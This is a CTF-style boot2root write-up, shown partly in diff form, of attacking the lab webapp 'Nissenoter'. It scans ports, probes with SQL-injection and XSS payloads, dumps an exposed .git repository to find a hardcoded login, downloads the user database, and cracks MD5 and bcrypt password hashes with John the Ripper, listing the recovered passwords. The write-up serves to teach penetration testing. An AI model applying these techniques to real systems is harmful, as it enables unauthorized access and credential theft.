style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>haaukins㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ sudo nmap -sC -sV -O -p- 77.76.246.224
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> haaukins:
+</span></span><span style=display:flex><span>Starting Nmap 7.93 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2023-12-21 05:05 EST
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 77.76.246.224
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00019s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65533</span> closed tcp ports <span style=color:#f92672>(</span>reset<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
+</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| ssh-hostkey:
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 308e05b497e351bc0200005355850ca0 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 7de127b32e30c096e70dc32f62703266 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.57 <span style=color:#f92672>((</span>Debian<span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span>| http-robots.txt: <span style=color:#ae81ff>1</span> disallowed entry
+</span></span><span style=display:flex><span>|_/static/
+</span></span><span style=display:flex><span>|_http-title: Log ind
+</span></span><span style=display:flex><span>| http-git:
+</span></span><span style=display:flex><span>|   77.76.246.224:80/.git/
+</span></span><span style=display:flex><span>|     Git repository found!
+</span></span><span style=display:flex><span>|     .gitignore matched patterns <span style=color:#e6db74>&#39;bug&#39;</span>
+</span></span><span style=display:flex><span>|     .git/config matched patterns <span style=color:#e6db74>&#39;user&#39;</span>
+</span></span><span style=display:flex><span>|     Repository description: Unnamed repository; edit this file <span style=color:#e6db74>&#39;description&#39;</span> to name the...
+</span></span><span style=display:flex><span>|     Last commit message: nu med mere shoutbox
+</span></span><span style=display:flex><span>|_    Project type: node.js application <span style=color:#f92672>(</span>guessed from .gitignore<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.57 <span style=color:#f92672>(</span>Debian<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>MAC Address: 02:42:4D:4C:F6:E0 <span style=color:#f92672>(</span>Unknown<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Device type: general purpose
+</span></span><span style=display:flex><span>Running: Linux 4.X|5.X
+</span></span><span style=display:flex><span>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+</span></span><span style=display:flex><span>OS details: Linux 4.15 - 5.6
+</span></span><span style=display:flex><span>Network Distance: <span style=color:#ae81ff>1</span> hop
+</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 11.88 seconds
+</span></span></code></pre></div><p>We find the note sharing server with two open ports and take note of port 22 (ssh) & 80 (http, usually a web app) being open!
+This would ordinarily indicate that we need to exploit a webapp (often PHP-based) being hosted on an Apache server!</p><p>We also find a robot.txt file, which is always a great idea to check for, when hacking webapps!
+Even more interestingly we also find a git repository on the server at &ldquo;/.git/&rdquo;!</p><h3 id=exploitation>Exploitation<a href=#exploitation class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>With plenty of interesting leads to go by, we connect to the address and take a look ath the webapp</p><p><img src=/nc3/boot2root/nissenoter-1/images/Webapp.png alt="Nissenoter webapp"></p><p>We are greeted by a login form and a &ldquo;shout box&rdquo; on the inital page.
+When facing a login form one should always try out &ldquo;default credentials&rdquo;, such as &ldquo;user/user&rdquo; & &ldquo;admin/admin&rdquo; and also test for low hanging <a href="https://www.imperva.com/learn/application-security/sql-injection-sqli/#:~:text=SQL%20injection%2C%20also%20known%20as,lists%20or%20private%20customer%20details.">SQL injection</a>, which can be testet with something as simple as the following in the input fields.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#e6db74>&#39; OR 1=1; --
+</span></span></span></code></pre></div><p>So of course we try our luck.</p><p><img src=/nc3/boot2root/nissenoter-1/images/Invalid%20login%20credentials.png alt="Invalid login"></p><p>It does however not appear to be that easy.
 In the network tab, we take not of the endpoint the webapp requests when authenticating &ldquo;/api/authenticate&rdquo;.
 We also see that continous calls are made to &ldquo;/api/shout/get/25&rdquo;, which would appear to be the request fetching data for the &ldquo;shout box&rdquo;.
-When looking through the shouts in the box we see different characters being used, which decreases the likelyhood of <a href="https://owasp.org/www-community/attacks/xss/">Cross Site Scripting (XSS)</a> working, but it should be tested regardless! The simplest test is to try out if an alert box can be opened</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&lt;script&gt;alert<span style="color:#f92672">(</span>‘XSS’<span style="color:#f92672">)</span>&lt;/script&gt;
-</span></span></code></pre></div><p>If an alert box were to open on the webapp, we could utilize more complex XSS attacks to exploit our way in, but unfortunately the text just gets added as a shout.</p>
-<p>We take note of the endpoint request when adding the shout at &ldquo;/api/shout/add&rdquo; and also take note of the <!-- raw HTML omitted --> format of the user shouts, which just seems to be hexadecimals. When we decode the values we don&rsquo;t get anything useful.</p>
-<p>Having tested the site functionality we remember to check out the &ldquo;nissenoter.nc3/robots.txt&rdquo;, that we saw from our nmap scan.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>User-Agent: *
-</span></span><span style="display:flex;"><span>Disallow: /static/
-</span></span></code></pre></div><p>Interestingly we see that there is a &ldquo;/static/&rdquo; folder, for which we are prevented access.</p>
-<p>We also need to check out if we can &ldquo;dump&rdquo; the git repository on the webapp. There are a few great tools for this, one well known being the <a href="https://github.com/arthaud/git-dumper">git-dumper</a> cli tool, but I recently came across something even faster, which is a browser extension that can automatically detect available repositories on websites and even download them, called <a href="https://github.com/davtur19/DotGit">DotGit</a>.</p>
-<p><img src="/nc3/boot2root/nissenoter-1/images/DotGit.png" alt="Dot Git Found Repo"></p>
-<p>Often when dumping a git repository we won&rsquo;t be able to fetch all files, so we need to reset it to the original state, which can be achieved with the git command</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>haaukins㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/nissenoter_nc3<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ git status
-</span></span><span style="display:flex;"><span>On branch master
-</span></span><span style="display:flex;"><span>Changes not staged <span style="color:#66d9ef">for</span> commit:
-</span></span><span style="display:flex;"><span>  <span style="color:#f92672">(</span>use <span style="color:#e6db74">&#34;git add/rm &lt;file&gt;...&#34;</span> to update what will be committed<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#f92672">(</span>use <span style="color:#e6db74">&#34;git restore &lt;file&gt;...&#34;</span> to discard changes in working directory<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>	deleted:    .gitignore
-</span></span><span style="display:flex;"><span>	deleted:    .htaccess
-</span></span><span style="display:flex;"><span>	deleted:    composer.json
-</span></span><span style="display:flex;"><span>	deleted:    composer.lock
-</span></span><span style="display:flex;"><span>	deleted:    core.php
-</span></span><span style="display:flex;"><span>	deleted:    core/Container.php
-</span></span><span style="display:flex;"><span>	deleted:    core/Controllers/AuthController.php
-</span></span><span style="display:flex;"><span>	deleted:    core/Controllers/ControllerInterface.php
-</span></span><span style="display:flex;"><span>	deleted:    core/Controllers/IndexController.php
-</span></span><span style="display:flex;"><span>	deleted:    core/Controllers/NotesController.php
-</span></span><span style="display:flex;"><span>	deleted:    core/Controllers/ProfileController.php
-</span></span><span style="display:flex;"><span>	deleted:    core/Controllers/ShoutController.php
-</span></span><span style="display:flex;"><span>	deleted:    core/Models/User.php
-</span></span><span style="display:flex;"><span>	deleted:    core/Utils/Database.php
-</span></span><span style="display:flex;"><span>	deleted:    core/Utils/Flash.php
-</span></span><span style="display:flex;"><span>	deleted:    core/Utils/HTTP.php
-</span></span><span style="display:flex;"><span>	deleted:    core/Utils/Session.php
-</span></span><span style="display:flex;"><span>	deleted:    core/Utils/Variable.php
-</span></span><span style="display:flex;"><span>	deleted:    core/index.html
-</span></span><span style="display:flex;"><span>	deleted:    index.php
-</span></span><span style="display:flex;"><span>	deleted:    robots.txt
-</span></span><span style="display:flex;"><span>	deleted:    static/bootstrap/bootstrap.min.css
-</span></span><span style="display:flex;"><span>	deleted:    static/bootstrap/bootstrap.min.css.map
-</span></span><span style="display:flex;"><span>	deleted:    static/bootstrap/bootstrap.min.js
-</span></span><span style="display:flex;"><span>	deleted:    static/bootstrap/bootstrap.min.js.map
-</span></span><span style="display:flex;"><span>	deleted:    static/default.css
-</span></span><span style="display:flex;"><span>	deleted:    static/fontawesome-free-6.2.1-web/css/all.min.css
-</span></span><span style="display:flex;"><span>	deleted:    static/fontawesome-free-6.2.1-web/webfonts/fa-brands-400.ttf
-</span></span><span style="display:flex;"><span>	deleted:    static/fontawesome-free-6.2.1-web/webfonts/fa-brands-400.woff2
-</span></span><span style="display:flex;"><span>	deleted:    static/fontawesome-free-6.2.1-web/webfonts/fa-regular-400.ttf
-</span></span><span style="display:flex;"><span>	deleted:    static/fontawesome-free-6.2.1-web/webfonts/fa-regular-400.woff2
-</span></span><span style="display:flex;"><span>	deleted:    static/fontawesome-free-6.2.1-web/webfonts/fa-solid-900.ttf
-</span></span><span style="display:flex;"><span>	deleted:    static/fontawesome-free-6.2.1-web/webfonts/fa-solid-900.woff2
-</span></span><span style="display:flex;"><span>	deleted:    static/fontawesome-free-6.2.1-web/webfonts/fa-v4compatibility.ttf
-</span></span><span style="display:flex;"><span>	deleted:    static/fontawesome-free-6.2.1-web/webfonts/fa-v4compatibility.woff2
-</span></span><span style="display:flex;"><span>	deleted:    static/index.css
-</span></span><span style="display:flex;"><span>	deleted:    static/index.html
-</span></span><span style="display:flex;"><span>	deleted:    static/templates/errors/400.twig
-</span></span><span style="display:flex;"><span>	deleted:    static/templates/errors/403.twig
-</span></span><span style="display:flex;"><span>	deleted:    static/templates/errors/404.twig
-</span></span><span style="display:flex;"><span>	deleted:    static/templates/errors/405.twig
-</span></span><span style="display:flex;"><span>	deleted:    static/templates/errors/500.twig
-</span></span><span style="display:flex;"><span>	deleted:    static/templates/footer.twig
-</span></span><span style="display:flex;"><span>	deleted:    static/templates/index.html
-</span></span><span style="display:flex;"><span>	deleted:    static/templates/index.twig
-</span></span><span style="display:flex;"><span>	deleted:    static/templates/login.twig
-</span></span><span style="display:flex;"><span>	deleted:    static/templates/master.twig
-</span></span><span style="display:flex;"><span>	deleted:    static/templates/navbar.twig
-</span></span><span style="display:flex;"><span>	deleted:    static/templates/notes_add.twig
-</span></span><span style="display:flex;"><span>	deleted:    static/templates/notes_index.twig
-</span></span><span style="display:flex;"><span>	deleted:    static/templates/notes_view.twig
-</span></span><span style="display:flex;"><span>	deleted:    static/templates/profile.twig
-</span></span><span style="display:flex;"><span>	deleted:    static/templates/profile_edit.twig
-</span></span><span style="display:flex;"><span>	deleted:    static/templates/shoutbox.twig
-</span></span><span style="display:flex;"><span>	deleted:    user_notes/.htaccess
-</span></span><span style="display:flex;"><span>	deleted:    user_notes/index.html
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>no changes added to commit <span style="color:#f92672">(</span>use <span style="color:#e6db74">&#34;git add&#34;</span> and/or <span style="color:#e6db74">&#34;git commit -a&#34;</span><span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>haaukins㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/nissenoter_nc3<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ git restore .
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>haaukins㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/nissenoter_nc3<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ git status
-</span></span><span style="display:flex;"><span>On branch master
-</span></span><span style="display:flex;"><span>nothing to commit, working tree clean
-</span></span></code></pre></div><p>With the repository fully restored, it turns out to be the repository for the webapp project we are currently browsing!</p>
-<p><img src="/nc3/boot2root/nissenoter-1/images/Nissenoter-dump.png" alt="Nissenoter Git Dump"></p>
-<p>In general it is always a good idea to search for credentials in a repository, so first we search through all the files in the current branch and afterwards we search throughout the commit history.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nissenoter_nc3 @927598b7 &gt; git log
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>commit 1d121e8b65641709cb00af227f2c31d2f964b3d3
-</span></span><span style="display:flex;"><span>Author: nissen &lt;nissen@nordpolen.jul&gt;
-</span></span><span style="display:flex;"><span>Date:   Tue Nov <span style="color:#ae81ff">1</span> 12:42:00 <span style="color:#ae81ff">2022</span> +0100
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    Nu uden hardcoded bruger
-</span></span></code></pre></div><p>This seems very interesting, as it states that a hardcoded user has been removed! Let&rsquo;s check out the commit just before this removal.</p>
-<p>In the previous commit we can see that in &ldquo;/core/Models/User.php&rdquo; the following implementation of the authenticate function contains some credentials!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">authenticate</span>(<span style="color:#a6e22e">string</span> $username, <span style="color:#a6e22e">string</span> $password) <span style="color:#f92672">:</span> <span style="color:#a6e22e">bool</span> {
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>($username <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;chefnissen&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $password <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;DenGyldneKanel&#39;</span>) {
-</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">user_id</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;chefnissen&#39;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><p>I immediately test out the credentials &ldquo;chefnissen:DenGyldneKanel&rdquo; in the login form and try to connect with SSH, but the credentials are unfortunately invalid.</p>
-<p>It appears that we need to try harder, which is always a good mindset in hacking, so we return to the latest commit version of the repository and analyse the project files.</p>
-<h3 id="getting-foothold-on-the-webapp">Getting foothold on the webapp<a href="#getting-foothold-on-the-webapp" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-<p>In the file /index.php we find a very intresting line for setting up a database connection!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$database <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Database</span>(<span style="color:#e6db74">&#39;core/nissebanden.db&#39;</span>);
-</span></span></code></pre></div><p>This database file does not exist in the repository, so let&rsquo;s see if we can download it!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>haaukins㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ wget http://nissenoter.nc3/core/nissebanden.db
-</span></span><span style="display:flex;"><span>--2023-12-21 05:59:37--  http://nissenoter.nc3/core/nissebanden.db
-</span></span><span style="display:flex;"><span>Resolving nissenoter.nc3 <span style="color:#f92672">(</span>nissenoter.nc3<span style="color:#f92672">)</span>... 77.76.246.224
-</span></span><span style="display:flex;"><span>Connecting to nissenoter.nc3 <span style="color:#f92672">(</span>nissenoter.nc3<span style="color:#f92672">)</span>|77.76.246.224|:80... connected.
-</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
-</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">20480</span> <span style="color:#f92672">(</span>20K<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>Saving to: ‘nissebanden.db’
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>nissebanden.db      100%<span style="color:#f92672">[===================</span>&gt;<span style="color:#f92672">]</span>  20.00K  --.-KB/s    in 0s
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>2023-12-21 05:59:37 <span style="color:#f92672">(</span><span style="color:#ae81ff">116</span> MB/s<span style="color:#f92672">)</span> - ‘nissebanden.db’ saved <span style="color:#f92672">[</span>20480/20480<span style="color:#f92672">]</span>
-</span></span></code></pre></div><p>Great Scott! We managed to download a database from the website!</p>
-<p>If we take a look in &ldquo;/core/Utils/Database.php&rdquo; we can quickly identify, in the constructor of the class, that we are dealing with a SQLite database.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(<span style="color:#a6e22e">string</span> $dbname) {
-</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">dsn</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;sqlite:&#39;</span> <span style="color:#f92672">.</span> $dbname;
-</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">connect</span>();
-</span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><p>There is a great tool for browsing SQLite database files, called <a href="https://sqlitebrowser.org/">DB Browser for SQLite</a>, which we can use to analyse the content.</p>
-<p><img src="/nc3/boot2root/nissenoter-1/images/DB%20Browser.png" alt="DB Browser"></p>
-<p>When diving into the database, we see 2 tables: shouts &amp; users, the latter being of highest interest!</p>
-<p><img src="/nc3/boot2root/nissenoter-1/images/Users-table.png" alt="Users table"></p>
-<p>We quickly note down all the user information and take note of password hashes that we need to try and crack, along with the fact that only &ldquo;Oluf Sand&rdquo; has a last name and only a few users have roles and descriptions!</p>
-<p>There are many good tools for analysing &amp; cracking hashes, but I like <a href="https://hashes.com/en/tools/hash_identifier">Hashes.com</a> for a quick analysis, which yields us the identification of a <a href="https://en.wikipedia.org/wiki/Bcrypt">Bcrypt hash</a>.</p>
-<p>What is important about Bcrypt is the &ldquo;input cost&rdquo;, which can help determine how feasible bruteforcing a hash might be.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$2b$04$fVZgTuYoXVfTLpFFNY.UkeX3Pm1MDrV9h4bx/pA41o9s4i49.MYEK
-</span></span><span style="display:flex;"><span>\__/\/ \____________________/\_____________________________/
-</span></span><span style="display:flex;"><span>Alg Cost      Salt                        Hash
-</span></span></code></pre></div><p>With this in mind, we see a cost of 4 for the hashes we are working in, which is great news, seeing as the standard is 12. This gives us hope that a tool like <a href="https://hashcat.net/hashcat/">hashcat</a> or <a href="https://www.freecodecamp.org/news/crack-passwords-using-john-the-ripper-pentesting-tutorial/">John The Ripper</a> might be successful, given a proper wordlist like <a href="https://www.kaggle.com/datasets/wjburns/common-password-list-rockyoutxt">rockyou</a>, which contains more than 14 million passwords!</p>
-<p>There is however another interesting column in the table, which is &ldquo;old_hashes&rdquo; of the type BLOB (binary large object).
-With a nifty sql query we can extract these hashes with their respective usernames.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> username<span style="color:#f92672">||</span><span style="color:#e6db74">&#39;:&#39;</span><span style="color:#f92672">||</span>hex(old_hashes) <span style="color:#66d9ef">FROM</span> users
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>olufsand:F7F497C879D74A0AD51B90AEB158B58F
-</span></span><span style="display:flex;"><span>fritz:E80B5017098950FC58AAD83C8C14978E
-</span></span><span style="display:flex;"><span>hansi:99F2CF8253C31FCE12E59B0DA36E35D3
-</span></span><span style="display:flex;"><span>gunter:C378985D629E99A4E86213DB0CD5E70D
-</span></span><span style="display:flex;"><span>nissen:E91697A354EBB6C05444005205C30DA2
-</span></span><span style="display:flex;"><span>springer:7C6A180B36896A0A8C02787EEAFB0E4C
-</span></span><span style="display:flex;"><span>danser:602A6AA8B4EBD6BDF19B38085163EC86
-</span></span><span style="display:flex;"><span>smukke:25D55AD283AA400AF464C76D713C07AD
-</span></span><span style="display:flex;"><span>konge:FD83506C25FF1476D7F39349A1B90D81
-</span></span><span style="display:flex;"><span>komet:84DA0B929DC922D0958FDF870F546794
-</span></span><span style="display:flex;"><span>amor:B2B85EC7EC8CC4771B8D055AEE5F82B0
-</span></span><span style="display:flex;"><span>torden:3D4FE7A00BC6FB52A91685D038733D6F
-</span></span><span style="display:flex;"><span>lyn:191140C5F780C8D66203858C5055BEA8
-</span></span><span style="display:flex;"><span>rudolf:12679B745F71E4327FAE7801F39B634B
-</span></span></code></pre></div><p>When we try to identify these hashes we quickly see that they are MD5 hashes and very easily crackable with John!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ john md5_hashes.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt --format<span style="color:#f92672">=</span>Raw-MD5
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
-</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">14</span> password hashes with no different salts <span style="color:#f92672">(</span>Raw-MD5 <span style="color:#f92672">[</span>MD5 128/128 AVX
-</span></span><span style="display:flex;"><span>4x3<span style="color:#f92672">])</span>
-</span></span><span style="display:flex;"><span>Warning: no OpenMP support <span style="color:#66d9ef">for</span> this hash type, consider --fork<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>
-</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">12345678</span> <span style="color:#f92672">(</span>smukke<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>chocolate <span style="color:#f92672">(</span>gunter<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>password1 <span style="color:#f92672">(</span>springer<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>abcdef <span style="color:#f92672">(</span>fritz<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>christmas <span style="color:#f92672">(</span>torden<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>midnight1 <span style="color:#f92672">(</span>olufsand<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>beautiful! <span style="color:#f92672">(</span>amor<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>nooneknows <span style="color:#f92672">(</span>nissen<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>merrychristmas <span style="color:#f92672">(</span>komet<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>julemand <span style="color:#f92672">(</span>hansi<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>christmastime <span style="color:#f92672">(</span>danser<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>ilovechristmas <span style="color:#f92672">(</span>konge<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>commander007 <span style="color:#f92672">(</span>rudolf<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>!happiness! <span style="color:#f92672">(</span>lyn<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>14g 0:00:00:00 DONE <span style="color:#f92672">(</span>2023-12-15 10:00<span style="color:#f92672">)</span> 21.21g/s 21725Kp/s 21725Kc/s 36620KC/s
-</span></span><span style="display:flex;"><span>!hector..!fqbn9a?
-</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show --format=Raw-MD5&#34;</span> options to display all of the cracked
-</span></span><span style="display:flex;"><span>passwords reliably
-</span></span><span style="display:flex;"><span>Session completed.
-</span></span></code></pre></div><p>Perfect, we got all the MD5 hashes from rockyou within seconds, now let&rsquo;s start cracking the Bcrypt passwords, which might take a bit longer.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ john bcrypt_hashes.txt --wordlist<span style="color:#f92672">=</span>custom_wordlist.txt
-</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
-</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">14</span> password hashes with <span style="color:#ae81ff">14</span> different salts <span style="color:#f92672">(</span>bcrypt <span style="color:#f92672">[</span>Blowfish 32/64 X3<span style="color:#f92672">])</span>
-</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">16</span> <span style="color:#66d9ef">for</span> all loaded hashes
-</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">4</span> OpenMP threads
-</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
-</span></span><span style="display:flex;"><span>christmastime <span style="color:#f92672">(</span>danser<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>christmas <span style="color:#f92672">(</span>torden<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>commander007 <span style="color:#f92672">(</span>rudolf<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>julemand <span style="color:#f92672">(</span>hansi<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>chocolate <span style="color:#f92672">(</span>gunter<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>5g 0:00:00:00 DONE <span style="color:#f92672">(</span>2023-12-15 13:37<span style="color:#f92672">)</span> 100.0g/s 300.0p/s 4200c/s 4200C/s
